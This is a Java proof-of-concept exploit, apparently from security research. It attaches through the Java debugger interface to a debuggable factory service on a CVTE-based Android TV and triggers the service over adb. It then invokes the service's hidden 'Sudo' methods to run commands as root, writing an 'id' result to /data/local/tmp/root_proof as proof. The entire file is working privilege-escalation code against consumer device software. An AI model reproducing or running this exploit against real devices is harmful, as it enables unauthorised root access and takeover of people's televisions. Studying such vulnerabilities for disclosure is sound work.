import com.sun.jdi.*;
import com.sun.jdi.connect.*;
import com.sun.jdi.event.*;
import com.sun.jdi.request.*;
import java.util.*;

public class JdiSudo {
    static Method findMethod(ReferenceType t, String name, String sig) {
        for (Method m : t.methodsByName(name)) if (m.signature().equals(sig)) return m;
        return null;
    }
    static void describe(InvocationException ie) {
        ObjectReference ex = ie.exception();
        System.out.println("  exception class=" + ex.referenceType().name());
        try {
            Field f = ex.referenceType().fieldByName("detailMessage");
            if (f != null) System.out.println("  message=" + ex.getValue(f));
        } catch (Throwable t) {}
    }

    public static void main(String[] args) throws Exception {
        AttachingConnector conn = null;
        for (AttachingConnector c : Bootstrap.virtualMachineManager().attachingConnectors()) {
            if (c.name().equals("com.sun.jdi.SocketAttach")) conn = c;
        }
        Map<String, Connector.Argument> cargs = conn.defaultArguments();
        cargs.get("hostname").setValue("localhost");
        cargs.get("port").setValue("8700");
        cargs.get("timeout").setValue("5000");
        VirtualMachine vm = conn.attach(cargs);
        System.out.println("attached " + vm.name());
        try {
            ReferenceType svc = vm.classesByName("com.cvte.factory.service.MainService").get(0);
            Method onStart = findMethod(svc, "onStartCommand", "(Landroid/content/Intent;II)I");
            BreakpointRequest bp = vm.eventRequestManager().createBreakpointRequest(onStart.location());
            bp.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD);
            bp.enable();

            Thread trigger = new Thread(() -> {
                try {
                    Thread.sleep(1200);
                    new ProcessBuilder("adb", "-s", "<TV_IP>:5555", "shell",
                            "am", "startservice", "-n", "com.cvte.factory.service/.MainService",
                            "-a", "cvte.factory.intent.action.APIInit").inheritIO().start().waitFor();
                } catch (Exception e) { e.printStackTrace(); }
            });
            trigger.start();

            vm.resume();
            EventSet es = vm.eventQueue().remove(15000);
            ThreadReference thr = null;
            if (es != null) for (Event ev : es) if (ev instanceof BreakpointEvent) thr = ((BreakpointEvent) ev).thread();
            if (thr == null) { System.out.println("no breakpoint"); vm.resume(); return; }
            System.out.println("thread " + thr.name());

            ClassType targetClass = null;
            Method sudoM = null, sudoOutM = null, checkM = null;
            for (ReferenceType rt : vm.allClasses()) {
                if (!(rt instanceof ClassType)) continue;
                for (Method m : rt.methodsByName("SudoWithOutput")) {
                    if (m.signature().equals("(Ljava/lang/String;)Ljava/lang/String;")) {
                        targetClass = (ClassType) rt;
                        sudoOutM = m;
                    }
                }
            }
            if (targetClass == null) { System.out.println("Sudo class not found"); bp.disable(); vm.resume(); return; }
            System.out.println("class " + targetClass.name());
            sudoM = findMethod(targetClass, "Sudo", "(Ljava/lang/String;)Z");
            checkM = findMethod(targetClass, "checkStartService", "()Z");
            System.out.println("Sudo static=" + (sudoM != null && sudoM.isStatic()) + " check static=" + (checkM != null && checkM.isStatic()));

            if (checkM != null && checkM.isStatic()) {
                try {
                    Value r = targetClass.invokeMethod(thr, checkM, Collections.emptyList(), 0);
                    System.out.println("checkStartService=" + r);
                } catch (InvocationException ie) { describe(ie); }
            }
            if (sudoOutM != null && sudoOutM.isStatic()) {
                try {
                    Value r = targetClass.invokeMethod(thr, sudoOutM, Collections.singletonList(vm.mirrorOf("id")), 0);
                    System.out.println("SudoWithOutput(id)=" + (r instanceof StringReference ? ((StringReference) r).value() : r));
                } catch (InvocationException ie) { describe(ie); }
            }
            if (sudoM != null && sudoM.isStatic()) {
                try {
                    Value r = targetClass.invokeMethod(thr, sudoM,
                            Collections.singletonList(vm.mirrorOf("id > /data/local/tmp/root_proof 2>&1")), 0);
                    System.out.println("Sudo(id>proof)=" + r);
                } catch (InvocationException ie) { describe(ie); }
            }
            bp.disable();
            vm.resume();
            System.out.println("resumed");
        } finally {
            vm.dispose();
        }
    }
}
